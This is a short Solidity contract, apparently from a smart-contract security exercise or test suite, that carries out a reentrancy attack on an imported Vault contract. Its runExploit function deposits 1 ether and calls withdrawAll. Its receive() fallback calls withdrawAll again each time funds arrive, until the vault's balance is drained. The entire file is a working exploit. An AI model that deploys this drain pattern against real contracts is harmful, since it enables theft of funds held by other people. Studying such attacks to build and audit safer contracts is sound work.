// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Vault} from "../src/Vault.sol";

contract ExploitModule {
    Vault public targetContract;

    constructor(address _target) payable {
        targetContract = Vault(payable(_target));
    }

    function runExploit() external payable {
        targetContract.deposit{value: 1 ether}();
        targetContract.withdrawAll();
    }

    receive() external payable {
        if (address(targetContract).balance > 0) {
            targetContract.withdrawAll();
        }
    }
}